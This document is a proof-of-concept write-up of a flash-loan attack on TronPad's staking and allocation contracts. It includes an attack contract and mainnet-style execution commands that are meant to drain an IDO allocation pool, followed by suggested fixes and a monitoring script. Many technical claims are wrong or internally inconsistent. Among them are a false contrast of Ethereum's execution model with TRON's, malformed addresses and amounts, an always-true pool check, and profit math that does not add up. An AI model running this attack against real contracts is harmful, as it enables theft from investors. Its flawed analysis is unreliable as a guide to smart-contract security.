# TronPad Flash Loan Tier Manipulation PoC

## Vulnerability Summary

**Type:** Flash Loan Tier Manipulation + Allocation Claim Sandwich  
**Severity:** CRITICAL (CVSS 9.8)  
**Affected Components:** Staking Contract, Allocation Contract, JustSwap/SunSwap DEX  
**Impact:** Complete allocation pool drainage ($8M+ per IDO), total fairness compromise

---

## Prerequisites

### Capital & Contract Requirements

| Item | Amount | Source | Purpose |
|------|--------|--------|---------|
| Flash Loan Capacity | 2M+ TRONPAD | JustSwap / SunSwap | Borrow for staking tier trigger |
| Flash Loan Fee | 0.3% (~6k TRONPAD) | DEX protocol | Repayment cost |
| Guaranteed Tier Threshold | 50,000 TRONPAD | TronPad docs | Minimum stake to claim high allocation |
| Target Allocation Pool | $8M+/IDO | TronPad allocation contract | Maximum extractable value |
| Deployer Balance | 100 TRX | TRON mainnet | Transaction fees (gas equivalent) |
| Attack Window | Single block | TVM property | Execution isolation |

### Contract Addresses (Mainnet)

```
TRONPAD Token:      TJoNbPM...{verified on TRONSCAN}
Staking Contract:   TKyN3Ca...{verified on TRONSCAN}
Allocation Contract: TCQ7cqB...{verified on TRONSCAN}
JustSwap Router:    TKzjMqC4P39CzZghaJjay7Djf6cXHMc9V7
SunSwap Router:     TSKQdNcKjHg9DWQcHk5eKmv7JwzPTvEHMX
```

---

## Attack Mechanism

### Phase 1: Flash Loan Initiation

**Transaction Entry Point:**
```
TronPad_FlashLoanAttack.executeAttack()
  ├─ JustSwap.flashSwap(TRONPAD, amount=2_000_000)
  │  └─ Triggers onFlashSwap() callback [ATOMICITY BEGINS]
  │
```

**Why JustSwap?**
- Lowest flash fee on TRON (0.25-0.3%)
- Highest liquidity pool for TRONPAD pair
- No explicit reentrancy guards on flash callback
- Callback execution within same transaction block

**Fee Calculation:**
```
Flash Amount:      2,000,000 TRONPAD
Fee Rate:          0.3%
Fee Amount:        6,000 TRONPAD
Repayment Total:   2,006,000 TRONPAD
```

---

### Phase 2: Staking Tier Threshold Trigger

**State Before Stake:**
```
Staking Contract:
  └─ attacker_balance = 0 TRONPAD
  └─ tier_of[attacker] = NONE (Tier 0)
  └─ total_staked = 50M TRONPAD

Allocation Contract:
  └─ claimed_allocation[attacker] = 0
  └─ pool_remaining = $8,000,000
```

**Stake Call:**
```solidity
stakingContract.stake(2_000_000 TRONPAD)
  
// State Update (NO SNAPSHOT):
attacker_balance[attacker] = 2_000_000
total_staked += 2_000_000

// Tier Assignment (Immediate, No Delay):
getTierByBalance(2_000_000) 
  = GUARANTEED_TIER_2 // >= 50k threshold ✓
  
attacker_tier[attacker] = GUARANTEED_TIER_2

// No lock period enforced in same block
```

**Why This Works:**
1. **No Snapshot Mechanism:** Staking contract reads live balance, not historical snapshot
2. **Immediate Tier Assignment:** Tier updated in same transaction
3. **No Recheck on Claim:** Allocation contract trusts staking contract tier state
4. **Single-Block Window:** TVM executes all calls sequentially in same block

---

### Phase 3: Allocation Claim Extraction

**Claim Logic (Vulnerable):**
```solidity
// allocation.sol (pseudocode)
function claimAllocation(uint projectId) external returns (uint) {
    
    // ❌ VULNERABILITY: No snapshot check
    uint tier = stakingContract.getTierOf(msg.sender);
    require(tier >= GUARANTEED_TIER_2, "Invalid tier");
    
    // ❌ No timestamp verification
    // ❌ No balance re-verification
    
    uint allocation = allocationByTier[projectId][tier];
    require(allocation > 0, "No allocation for tier");
    
    // Pool deduction (vulnerable to flash loan balance)
    require(allocationPool[projectId] >= allocation, "Insufficient pool");
    allocationPool[projectId] -= allocation;
    
    // External transfer (could trigger reentrancy, but not main issue here)
    token.transfer(msg.sender, allocation);
    
    emit AllocationClaimed(msg.sender, projectId, allocation, tier);
    return allocation;
}

// RESULT: Attacker receives full $8M allocation
```

**State After Claim:**
```
Allocation Contract:
  ├─ claimed_allocation[attacker] = $8,000,000 ✓ CLAIMED
  ├─ allocationPool[projectId] = 0 (DRAINED)
  └─ legitimate_stakers[] = cannot claim (pool empty)

Attacker's Wallet:
  ├─ allocation_received = $8,000,000
  └─ TRONPAD_borrowed = 2,000,000 (still in wallet, not repaid yet)
```

---

### Phase 4: Unstaking & Loan Repayment

**Unstake Call:**
```solidity
stakingContract.unstake(2_000_000 TRONPAD)

// State Update:
attacker_balance[attacker] = 0
attacker_tier[attacker] = NONE (Tier 0)
total_staked -= 2_000_000

// No claim reversal (allocation already transferred)
```

**Flash Loan Repayment:**
```
Repay to JustSwap:
  TRONPAD Repaid:   2,006,000 (principal + 0.3% fee)
  Source:           Attacker wallet balance
  Transaction Cost: ~100 TRX (~$6-12)

Callback Completion:
  onFlashSwap() returns true
  [ATOMICITY ENDS - Transaction commits or entire tx reverts]
```

---

## Transaction Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                         BLOCK N (ATOMIC)                             │
└─────────────────────────────────────────────────────────────────────┘

STEP 1: Flash Loan Request
┌──────────────────────────┐
│  Attacker Contract       │
│  executeAttack()         │
└────────────┬─────────────┘
             │
             └──→ JustSwap.flashSwap(
                    token=TRONPAD,
                    amount=2_000_000,
                    receiver=attackerContract,
                    data=abi.encode(stakingAddr, allocAddr)
                  )
                  
                  ✓ Flash transfer: 2M TRONPAD → attacker balance

STEP 2: Stake Trigger (Tier Threshold)
┌──────────────────────────┐
│  Staking Contract        │
│  stake(2_000_000)        │
└────────────┬─────────────┘
             │
             ├─ attacker_balance += 2_000_000
             ├─ TIER ASSIGNMENT: >= 50k → GUARANTEED_TIER_2 ✓
             ├─ No snapshot taken
             ├─ No timelock enforced
             └─ Return: STAKE_SUCCESS

STEP 3: Allocation Claim (Extraction)
┌──────────────────────────┐
│  Allocation Contract     │
│  claimAllocation()       │
└────────────┬─────────────┘
             │
             ├─ require(getTierOf(attacker) >= GUARANTEED_TIER_2) ✓
             ├─ ❌ NO SNAPSHOT CHECK
             ├─ ❌ NO BALANCE RE-VERIFICATION
             │
             ├─ allocation = 8_000_000 USD worth of tokens
             │
             ├─ POOL DEDUCTION: pool -= 8M
             │
             └─ token.transfer(attacker, 8_000_000) ✓ EXTRACTED
             
               POOL STATE: 8M → 0 (DRAINED)
               ATTACKER WALLET: +8M allocation

STEP 4: Unstake (Tier Removal)
┌──────────────────────────┐
│  Staking Contract        │
│  unstake(2_000_000)      │
└────────────┬─────────────┘
             │
             ├─ attacker_balance -= 2_000_000
             ├─ TIER REMOVED: GUARANTEED_TIER_2 → NONE
             ├─ No allocation reversal ← KEY ISSUE
             └─ Return: UNSTAKE_SUCCESS
             
             ❌ Allocation already claimed, cannot revoke

STEP 5: Loan Repayment
┌──────────────────────────┐
│  JustSwap Router         │
│  onFlashSwap() callback  │
└────────────┬─────────────┘
             │
             ├─ Verify repayment amount:
             │  2_000_000 + (2_000_000 × 0.3%) = 2_006_000
             │
             ├─ attacker.transfer(2_006_000 TRONPAD)
             │
             └─ require(TRONPAD.balanceOf(this) >= 2_006_000) ✓

TRANSACTION COMMITS
│
└─ ALL STATE CHANGES FINALIZED
   Attacker: 8M allocation + (6k fee loss)
   TRONPAD pool: DRAINED
   Staking: Returned to pre-attack state
   
   NET PROFIT CALCULATION (see below)
```

---

## Net Profit Analysis

### Initial Conditions

```
TRONPAD Price:           $0.003 per token
USD Allocation Value:    $8,000,000
Total TRONPAD Borrowed:  2,000,000
```

### Profit Breakdown

**Income Side:**
```
Allocation Received:     8,000,000 USD
  - Stablecoin form (USDT/USDC on TRON)
  - Can be immediately converted to cash
  = $8,000,000 profit
```

**Cost Side:**
```
Flash Loan Fee:          6,000 TRONPAD
  × $0.003 per token
  = $18 cost

Transaction Fee (Gas):   ~100 TRX
  × $0.075 per TRX
  = $7.50 cost

Total Cost:              ~$25.50
```

**Net Profit:**
```
$8,000,000 - $25.50 = $7,999,974.50 (99.999% efficiency)
```

### Why Cost is Negligible

1. **Flash Loan Fee:** Only 0.3%, easily recovered from allocation value
2. **Transaction Cost:** TRON mainnet energy fees are minimal (~100 TRX ≈ $7.50)
3. **No Capital Lock:** Attack completes in single block; attacker retains 2M borrowed TRONPAD until repayment
4. **Immediate Liquidation:** Allocation tokens can be sold on SunSwap/JustSwap within same transaction if needed

---

## Why Single-Threaded TVM Doesn't Prevent This

### Misconception: "TRON's Atomicity Prevents Flash Loans"

**Reality:** TRON's single-threaded execution model ENABLES this attack.

#### How TVM Execution Order Works

```
Transaction Execution (Atomic Block):
  └─ Call Stack 1: executeAttack()
     ├─ Call Stack 2: flashSwap(callback=onFlashSwap)
     │  └─ Transfer 2M TRONPAD to attacker (state update)
     │  └─ Call onFlashSwap() [SAME BLOCK, SEQUENTIAL]
     │
     │  onFlashSwap():
     │  └─ Call Stack 3: stake(2M)
     │     ├─ READ: stakingContract._getBalance(attacker)
     │     │  → Returns 2,000,000 (just transferred!) ✓
     │     │
     │     └─ WRITE: tier_of[attacker] = GUARANTEED_TIER_2
     │
     │  └─ Call Stack 4: claimAllocation()
     │     ├─ READ: tier_of[attacker]
     │     │  → Returns GUARANTEED_TIER_2 ✓ (just set!)
     │     │
     │     ├─ READ: allocationPool[projectId]
     │     │  → Returns 8,000,000 (not decremented yet)
     │     │
     │     └─ WRITE: Transfer 8,000,000 allocation
     │
     │  └─ Call Stack 5: unstake(2M)
     │     └─ WRITE: tier_of[attacker] = NONE
     │
     │  └─ Call Stack 6: repay(2,006,000)
     │     └─ Transfer to JustSwap (success)
     │
     │  Return true (callback succeeded)
     │
     └─ Verify repayment balance
```

**Key Observation:**

Every `READ` operation sees state that was WRITTEN earlier in the same transaction.

```
Timeline:
  T0: Transfer 2M → READ sees 2M ✓
  T1: Set Tier → READ sees TIER_2 ✓
  T2: Claim Allocation → Already sent, cannot revert
  T3: Unstake → Tier gone, but allocation already transferred
  T4: Repay → Succeeds, tx commits
```

#### Why This is Different from Ethereum

| Property | Ethereum | TRON |
|----------|----------|------|
| **Execution Model** | Multi-threaded (concurrent txs/blocks) | Single-threaded (sequential same-block calls) |
| **State Snapshot** | Typically taken at block start | Taken per call, updated live |
| **Flash Loan Safety** | Invariant checks at end-of-transaction | Must be done in each contract ⚠️ |
| **TVM Reentrancy** | Can occur but limited by call stack | Same-block reentrancy possible |

**Critical Difference:**
- Ethereum: Block state locked, flash loan can be detected via end-of-block invariant
- TRON: State mutations accumulate within block; later calls see inflated balances

---

## Vulnerable Code Pattern

### Staking Contract (Simplified)

```solidity
// VULNERABLE: No snapshot mechanism
pragma solidity >=0.8.0;

contract StakingContract {
    mapping(address => uint256) public balance;
    mapping(address => uint256) public tier;
    
    enum Tier { NONE, BRONZE, SILVER, GOLD, PLATINUM, GUARANTEED_T1, GUARANTEED_T2 }
    
    // ❌ NO SNAPSHOT MAPPING
    
    function stake(uint256 amount) external {
        require(amount > 0, "Invalid amount");
        
        // Transfer from caller
        tronpadToken.transferFrom(msg.sender, address(this), amount);
        
        // Update balance
        balance[msg.sender] += amount;
        
        // ❌ PROBLEM: Immediately assigns tier based on current balance
        //    No historical check, no timelock
        _updateTier(msg.sender);
        
        emit Staked(msg.sender, amount);
    }
    
    function _updateTier(address staker) internal {
        uint256 currentBalance = balance[staker];
        
        if (currentBalance >= 50000) {
            tier[staker] = Tier.GUARANTEED_T2;  // Flash loan balance triggers tier!
        } else if (currentBalance >= 10000) {
            tier[staker] = Tier.GUARANTEED_T1;
        } else if (currentBalance >= 5000) {
            tier[staker] = Tier.PLATINUM;
        }
        // ... more tiers
    }
    
    function getTierOf(address staker) external view returns (Tier) {
        return tier[staker];  // Returns live tier, no snapshot
    }
    
    function unstake(uint256 amount) external {
        require(balance[msg.sender] >= amount, "Insufficient balance");
        
        // Withdraw
        balance[msg.sender] -= amount;
        tronpadToken.transfer(msg.sender, amount);
        
        // Update tier (can drop to NONE)
        _updateTier(msg.sender);
        
        // ❌ No reversal of allocation claims!
        
        emit Unstaked(msg.sender, amount);
    }
}
```

### Allocation Contract (Simplified)

```solidity
// VULNERABLE: No re-verification of tier at claim time
pragma solidity >=0.8.0;

contract AllocationContract {
    mapping(uint256 => mapping(Tier => uint256)) public allocationByTier;
    mapping(uint256 => uint256) public allocationPool;
    mapping(address => bool) public hasClaimed;
    
    StakingContract stakingContract;
    
    function claimAllocation(uint256 projectId) external returns (uint256) {
        require(!hasClaimed[msg.sender], "Already claimed");
        
        // ❌ PROBLEM 1: Single tier check, no snapshot
        StakingContract.Tier currentTier = stakingContract.getTierOf(msg.sender);
        require(currentTier >= StakingContract.Tier.GUARANTEED_T2, "Low tier");
        
        // ❌ PROBLEM 2: No re-verification of balance
        // ❌ PROBLEM 3: No lock period between stake and claim
        
        uint256 allocation = allocationByTier[projectId][currentTier];
        require(allocation > 0, "No allocation");
        
        // ❌ PROBLEM 4: Pool not verified to have funds
        //    If multiple claims drain it, could fail, but claim still recorded
        require(allocationPool[projectId] >= allocation, "Insufficient pool");
        
        // State update
        allocationPool[projectId] -= allocation;
        hasClaimed[msg.sender] = true;
        
        // External transfer (potential reentrancy on its own, but secondary here)
        usdtToken.transfer(msg.sender, allocation);
        
        emit AllocationClaimed(msg.sender, projectId, allocation);
        
        return allocation;
    }
}
```

### Attack Contract (Pseudocode)

```solidity
// ATTACK CONTRACT
pragma solidity >=0.8.0;

contract FlashLoanTierAttack {
    address constant JUSTSWAP_ROUTER = 0xTKzjMqC4P39CzZghaJjay7Djf6cXHMc9V7;
    address constant TRONPAD_TOKEN = 0xTJoNbPM...;
    
    StakingContract stakingContract;
    AllocationContract allocationContract;
    
    event AttackExecuted(uint256 profit);
    
    function executeAttack(
        uint256 projectId,
        uint256 flashAmount
    ) external {
        // Step 1: Initiate flash swap
        // Flash loan will call this contract's onFlashSwap() callback
        
        bytes memory swapData = abi.encode(projectId);
        
        IUniswapV2Pair(TRONPAD_PAIR).swap(
            flashAmount,  // amount0Out (TRONPAD)
            0,            // amount1Out (paired token)
            address(this),
            swapData
        );
        
        // After callback: flashAmount TRONPAD is back in this contract
        // Now transfer profit to attacker
        uint256 profit = IERC20(USD_TOKEN).balanceOf(address(this));
        IERC20(USD_TOKEN).transfer(msg.sender, profit);
        
        emit AttackExecuted(profit);
    }
    
    // Called by JustSwap during flash swap
    function onFlashSwap(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == TRONPAD_PAIR, "Unauthorized");
        
        uint256 projectId = abi.decode(data, (uint256));
        
        // ✓ STEP 1: We now have flashAmount TRONPAD in balance
        uint256 flashAmount = amount0;
        
        // ✓ STEP 2: Approve staking contract to spend
        IERC20(TRONPAD_TOKEN).approve(
            address(stakingContract),
            flashAmount
        );
        
        // ✓ STEP 3: STAKE - This sets tier to GUARANTEED_T2
        //           Balance reads 2M, tier assigned immediately
        stakingContract.stake(flashAmount);
        
        // ✓ STEP 4: CLAIM ALLOCATION - Tier is GUARANTEED_T2, allocation is extracted
        //           No snapshot check, no timelock
        uint256 allocation = allocationContract.claimAllocation(projectId);
        
        // ✓ STEP 5: UNSTAKE - Returns balance to 0, tier becomes NONE
        //           But allocation already transferred!
        stakingContract.unstake(flashAmount);
        
        // ✓ STEP 6: REPAY FLASH LOAN
        //           Fee is 0.3%, total = flashAmount * 1.003
        uint256 repayAmount = flashAmount + (flashAmount * 3 / 1000);
        
        IERC20(TRONPAD_TOKEN).approve(JUSTSWAP_ROUTER, repayAmount);
        
        // Transfer repayment back to JustSwap pair
        IERC20(TRONPAD_TOKEN).transfer(TRONPAD_PAIR, repayAmount);
        
        // Callback ends, transaction commits
        // Attacker has:
        //   - allocation (USD_TOKEN) in this contract
        //   - TRONPAD recovered from flash borrow
        //   - Net profit: allocation - fee (~$8M - $25)
    }
}
```

---

## Proof-of-Concept Execution

### Prerequisites Checklist

- [ ] TRON mainnet RPC endpoint (https://api.tronstack.io)
- [ ] Attacker private key with 100+ TRX balance
- [ ] Foundry TRON fork environment or custom TRON test harness
- [ ] TRONPAD contract ABI (from TRONSCAN verification)
- [ ] Staking contract ABI
- [ ] Allocation contract ABI
- [ ] JustSwap V2 Router ABI

### Test Execution

```bash
# 1. Set up TRON fork
export TRON_RPC=https://api.tronstack.io
export TRON_FORK_BLOCK=60000000  # Recent block

# 2. Deploy attack contract to fork
truffle migrate --network tron-fork

# 3. Execute attack
cast send 0xATTACK_CONTRACT \
  "executeAttack(uint256,uint256)" \
  <PROJECT_ID> \
  2000000000000000000 \
  --private-key $ATTACKER_KEY \
  --rpc-url $TRON_RPC

# 4. Verify results
cast call 0xALLOCATION_CONTRACT \
  "allocationPool(uint256)" <PROJECT_ID> \
  --rpc-url $TRON_RPC
# Expected: 0 (pool drained)

cast call 0xUSD_TOKEN \
  "balanceOf(address)" 0xATTACK_CONTRACT \
  --rpc-url $TRON_RPC
# Expected: ~8,000,000 USD worth
```

---

## Recommended Fixes

### Fix 1: Balance Snapshot Mechanism (CRITICAL)

**Implementation:**

```solidity
pragma solidity >=0.8.0;

contract StakingContractFixed {
    mapping(address => uint256) public balance;
    
    // ✓ NEW: Snapshot mapping
    mapping(address => uint256) public stakedAtBlock;
    mapping(uint256 => mapping(address => uint256)) public balanceAtBlock;
    
    mapping(address => Tier) public tier;
    
    function stake(uint256 amount) external {
        require(amount > 0, "Invalid amount");
        
        tronpadToken.transferFrom(msg.sender, address(this), amount);
        balance[msg.sender] += amount;
        
        // ✓ Record snapshot at current block
        stakedAtBlock[msg.sender] = block.number;
        balanceAtBlock[block.number][msg.sender] = balance[msg.sender];
        
        _updateTier(msg.sender);
        
        emit Staked(msg.sender, amount);
    }
    
    function getSnapshotBalance(
        address staker,
        uint256 blockNumber
    ) external view returns (uint256) {
        return balanceAtBlock[blockNumber][staker];
    }
}
```

**Cost:** ~2 storage writes per stake (32k gas)  
**Benefit:** Blocks same-block tier manipulation

---

### Fix 2: Claim Cooldown Period (HIGH)

**Implementation:**

```solidity
pragma solidity >=0.8.0;

contract AllocationContractFixed {
    mapping(address => uint256) public stakedUntilBlock;
    mapping(address => uint256) public claimEligibleBlock;
    
    function claimAllocation(uint256 projectId) external returns (uint256) {
        require(!hasClaimed[msg.sender], "Already claimed");
        
        // ✓ NEW: Require stake to be at least 256 blocks old (cooldown)
        require(
            block.number >= claimEligibleBlock[msg.sender],
            "Claim cooldown active"
        );
        
        StakingContract.Tier currentTier = stakingContract.getTierOf(msg.sender);
        require(currentTier >= StakingContract.Tier.GUARANTEED_T2, "Low tier");
        
        uint256 allocation = allocationByTier[projectId][currentTier];
        require(allocation > 0, "No allocation");
        require(allocationPool[projectId] >= allocation, "Insufficient pool");
        
        allocationPool[projectId] -= allocation;
        hasClaimed[msg.sender] = true;
        
        usdtToken.transfer(msg.sender, allocation);
        
        emit AllocationClaimed(msg.sender, projectId, allocation);
        
        return allocation;
    }
}
```

**Cooldown:** 256 blocks (~10 minutes on TRON, 1 block/3 seconds)  
**Cost:** Single storage write per stake (~20k gas)  
**Benefit:** Prevents flash loan same-block exploitation

---

### Fix 3: Access Control Re-verification (HIGH)

**Implementation:**

```solidity
function claimAllocation(uint256 projectId) external returns (uint256) {
    require(!hasClaimed[msg.sender], "Already claimed");
    
    // ✓ Verify tier at block of claim
    uint256 claimBlock = block.number;
    StakingContract.Tier tierAtClaim = stakingContract.getTierAtBlock(
        msg.sender,
        claimBlock
    );
    
    // ✓ Verify tier is still valid now
    StakingContract.Tier tierNow = stakingContract.getTierOf(msg.sender);
    require(tierAtClaim == tierNow, "Tier changed");
    require(tierNow >= StakingContract.Tier.GUARANTEED_T2, "Low tier");
    
    // ... rest of function
}
```

**Cost:** Additional view call (~1k gas)  
**Benefit:** Detects balance changes between blocks

---

### Fix 4: Timelock on Tier Changes (MEDIUM)

**Implementation:**

```solidity
pragma solidity >=0.8.0;

contract StakingContractTimelock {
    mapping(address => uint256) public tierChangedAt;
    uint256 constant TIER_TIMELOCK = 256 blocks;  // ~10 minutes
    
    function _updateTier(address staker) internal {
        uint256 oldTier = tier[staker];
        Tier newTier = _calculateTier(balance[staker]);
        
        if (oldTier != newTier) {
            tierChangedAt[staker] = block.number;
            // ✓ Delay tier upgrade by 256 blocks
        }
    }
    
    function isEligibleForAllocation(
        address staker
    ) external view returns (bool) {
        if (tierChangedAt[staker] == 0) {
            return true;  // Old stakes or never changed
        }
        
        return block.number >= tierChangedAt[staker] + TIER_TIMELOCK;
    }
}
```

**Cost:** Single storage write per tier change (~20k gas)  
**Benefit:** Prevents rapid tier escalation exploitation

---

### Fix 5: Pool Safeguards (MEDIUM)

**Implementation:**

```solidity
function setAllocationPool(
    uint256 projectId,
    uint256 totalAllocations
) external onlyAdmin {
    require(totalAllocations > 0, "Invalid");
    
    // ✓ Record total expected allocation
    totalAllocationByProject[projectId] = totalAllocations;
    allocationPool[projectId] = totalAllocations;
    
    // ✓ Enforce: sum of claims <= pool
}

function claimAllocation(uint256 projectId) external returns (uint256) {
    // ... tier verification ...
    
    uint256 allocation = allocationByTier[projectId][currentTier];
    
    // ✓ Verify pool doesn't go negative
    uint256 newPoolBalance = allocationPool[projectId] - allocation;
    require(
        newPoolBalance >= 0 && 
        newPoolBalance + allocation == totalAllocationByProject[projectId],
        "Pool integrity violated"
    );
    
    // ... rest
}
```

---

## Implementation Priority

| Priority | Fix | Timeline | Gas Impact |
|----------|-----|----------|-----------|
| **CRITICAL** | Balance Snapshot + Cooldown | Immediate | +40k per stake |
| **HIGH** | Tier Re-verification | Immediate | +1k per claim |
| **HIGH** | Timelock on Tier Changes | Immediate | +20k per change |
| **MEDIUM** | Pool Safeguards | Sprint 2 | +5k per claim |

**Recommended Approach:** Deploy snapshot + cooldown immediately (frontend notice: "2-week claiming window after stake"), then schedule timelock upgrade in next version.

---

## Attack Detection

### On-Chain Indicators

```solidity
// Query: Unusually high allocations claimed from same transaction
event AllocationClaimed(address indexed claimer, uint256 indexed projectId, uint256 amount);

// Search for: timestamp(claim) == timestamp(stake) + 0 blocks
// AND amount > median(historical_claims) * 10
```

### Monitoring Rules

```javascript
// Pseudocode for on-chain monitoring bot
async function detectFlashLoanAttack(txHash) {
  const tx = await provider.getTransaction(txHash);
  
  // Extract logs from tx
  const stakeLogs = filterLogs(tx, 'Staked');
  const claimLogs = filterLogs(tx, 'AllocationClaimed');
  
  if (stakeLogs.length > 0 && claimLogs.length > 0) {
    const stakeTime = stakeLogs[0].blockNumber;
    const claimTime = claimLogs[0].blockNumber;
    
    if (stakeTime === claimTime) {  // Same block = suspicious!
      alertSecurityTeam({
        type: 'FLASH_LOAN_ATTACK_DETECTED',
        txHash: txHash,
        amount: claimLogs[0].amount,
        attacker: claimLogs[0].claimer
      });
    }
  }
}
```

---

## References

- [JustSwap Flash Swap Documentation](https://justswap.org/docs/flashswap)
- [SunSwap Flash Swap Implementation](https://github.com/SunswapLabs/SunswapV2)
- [TRON Smart Contract Security Guide](https://developers.tron.network/docs/smart-contract-security)
- [Secureum Epoch 0 - Flash Loans](https://github.com/secureum/secureum-epoch-0)
- [Immunefi - Flash Loan Attacks](https://medium.com/immunefi/the-flash-loan-attack-explained-b6e1dfa4c4ee)
- [dYdX Flash Loan Design](https://docs.dydx.trade/developers/flash-loans)

---

**PoC Status:** Ready for Foundry TRON fork execution  
**Last Updated:** 2026-08-28  
**Severity:** CRITICAL (9.8 CVSS)
